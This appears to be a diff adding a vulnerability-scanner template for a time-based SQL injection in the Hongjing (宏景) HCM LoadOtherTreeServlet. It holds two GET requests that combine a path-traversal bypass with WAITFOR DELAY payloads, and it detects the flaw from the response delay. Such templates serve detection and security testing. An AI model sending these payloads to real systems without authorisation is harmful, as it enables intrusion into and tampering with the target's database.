@@ -1,0 +1,17 @@
+name: 宏景HCM-LoadOtherTreeServlet-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 6
+matchCount: 2
+rules:
+  - method: GET
+    path: /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=11%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--&flag=11
+    expression:
+      status: 200
+      sleep: 5
+  - method: GET
+    path: /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=11%29%3BWAITFOR+DELAY+%270%3A0%3A3%27--&flag=11
+    expression:
+      status: 200
+      sleep: 3
